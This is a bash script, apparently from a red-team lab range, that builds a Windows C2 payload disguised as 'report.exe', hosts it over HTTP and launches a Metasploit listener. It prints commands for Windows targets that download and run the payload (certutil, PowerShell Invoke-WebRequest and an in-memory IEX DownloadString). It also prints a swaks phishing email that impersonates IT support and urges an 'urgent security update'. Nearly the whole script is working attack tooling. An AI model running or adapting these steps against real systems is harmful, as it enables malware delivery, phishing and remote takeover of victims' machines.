#!/bin/bash
# Build a Windows C2 payload, optional Metasploit handler resource, serve it over HTTP :8080
# from the attack server's public IP, and print swaks / download examples (direct-to-victim path).
set -e

REGION="${1:-apac}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=/dev/null
source "${SCRIPT_DIR}/attack_c2_helpers/runner_lib.sh"
c2_validate_framework

SSH_KEY="terraform/certs/project-responder-ssh"
ATTACK_USER="ubuntu"
LPORT="4444"
PAYLOAD_NAME="report.exe"
HTTP_PORT="8080"

DETAILS_FILE="inventory/attack_server_details_${REGION}"
if [ ! -f "${DETAILS_FILE}" ]; then
    echo "[!] Details file not found: ${DETAILS_FILE}"
    echo "    Usage: $0 <region>  (e.g. apac, star, amer, emea, test-env)"
    echo "    Optional: C2_FRAMEWORK=metasploit|sliver|mythic|havoc (default: metasploit)"
    exit 1
fi

ATTACK_IP=$(awk '/^Linux Bastion Public IP:/ { print $5 }' "${DETAILS_FILE}")
if [ -z "${ATTACK_IP}" ]; then
    echo "[!] Could not extract attack server IP from ${DETAILS_FILE}"
    exit 1
fi

FIREWALL_EIP=$(awk '/^Firewall EIP:/ { print $3 }' "${DETAILS_FILE}")
if [ -z "${FIREWALL_EIP}" ]; then
    FIREWALL_EIP="<FIREWALL_EIP>"
fi

SSH_OPTS="-i ${SSH_KEY} -o StrictHostKeyChecking=no"

echo "[*] Region: ${REGION}"
echo "[*] C2_FRAMEWORK: ${C2_FRAMEWORK}"
echo "[*] Connecting to attack server at ${ATTACK_IP}..."

LHOST_REMOTE=$(ssh ${SSH_OPTS} "${ATTACK_USER}@${ATTACK_IP}" curl -s http://169.254.169.254/latest/meta-data/public-ipv4)
echo "[*] Attack server public IP: ${LHOST_REMOTE}"

c2_remote_payload "${SSH_OPTS}" "${ATTACK_USER}" "${ATTACK_IP}" "${LHOST_REMOTE}" "${LPORT}" "/home/ubuntu/${PAYLOAD_NAME}"

c2_remote_listener_doc "${SSH_OPTS}" "${ATTACK_USER}" "${ATTACK_IP}" "${LPORT}" "/home/ubuntu/listener.rc" "${LHOST_REMOTE}"

ssh ${SSH_OPTS} "${ATTACK_USER}@${ATTACK_IP}" bash -s <<REMOTE_SCRIPT
set -e
LHOST=\$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)
HTTP_PORT=${HTTP_PORT}
PAYLOAD_NAME=${PAYLOAD_NAME}

fuser -k \${HTTP_PORT}/tcp 2>/dev/null || true

echo "[*] Starting HTTP server on port \${HTTP_PORT} (serving /home/ubuntu/)..."
cd /home/ubuntu
nohup python3 -m http.server \${HTTP_PORT} > /tmp/http_server.log 2>&1 &
echo "[+] HTTP server PID: \$!"
PAYLOAD_URL="http://\${LHOST}:\${HTTP_PORT}/\${PAYLOAD_NAME}"
echo "[+] Payload URL: \${PAYLOAD_URL}"
echo ""
echo "============================================"
echo "  NEXT STEPS: Execute on Windows targets"
echo "============================================"
echo ""
echo "  CMD:"
echo "    certutil -urlcache -split -f \${PAYLOAD_URL} %TEMP%\\\${PAYLOAD_NAME} && %TEMP%\\\${PAYLOAD_NAME}"
echo ""
echo "  PowerShell:"
echo "    Invoke-WebRequest -Uri \${PAYLOAD_URL} -OutFile \$env:TEMP\\\${PAYLOAD_NAME}; Start-Process \$env:TEMP\\\${PAYLOAD_NAME}"
echo ""
echo "  PowerShell (in-memory):"
echo "    IEX (New-Object Net.WebClient).DownloadString('http://\${LHOST}:\${HTTP_PORT}/\${PAYLOAD_NAME}')"
echo ""
echo "  Target hosts:"
echo "    DC01        10.0.1.6"
echo "    client-1    10.0.1.10"
echo "    client-2    10.0.1.11"
echo "    client-3    10.0.1.12  (sam.hewitt - VS Code extension beacons every 90s)"
echo "    firewall    10.0.0.5   ${FIREWALL_EIP} (EIP - forwards :80/:443->web, :25->mail)"
echo "    web         10.0.0.6"
echo "    mail        10.0.0.7"
echo "    file        10.0.2.6"
echo "    sql         10.0.2.7"
echo ""
echo "  Phishing (from attack box):"
echo "    swaks --to ben@tsg-internal.lab --from it-support@tsg-internal.lab --server ${FIREWALL_EIP} --header 'Subject: Urgent Security Update' --body 'Please install the mandatory update: \${PAYLOAD_URL}'"
echo "============================================"
REMOTE_SCRIPT

echo ""
echo "[*] Setup complete. Listener: C2_FRAMEWORK=${C2_FRAMEWORK}"
if [[ "${C2_FRAMEWORK}" == "metasploit" ]]; then
    echo "[*] Launching Metasploit in tmux session 'msf'..."
    echo "  To reconnect later:  ssh ${SSH_OPTS} -t ${ATTACK_USER}@${LHOST_REMOTE} tmux attach -t msf"
    echo "============================================"
    c2_start_listener_tmux_or_print "${SSH_OPTS}" "${ATTACK_USER}" "${ATTACK_IP}" "msf" "/home/ubuntu/listener.rc"
else
    echo "[*] Start your ${C2_FRAMEWORK} listener to match this payload, then operate from that console."
    echo "    ssh ${SSH_OPTS} ${ATTACK_USER}@${ATTACK_IP} 'cat /home/ubuntu/listener.rc'"
fi
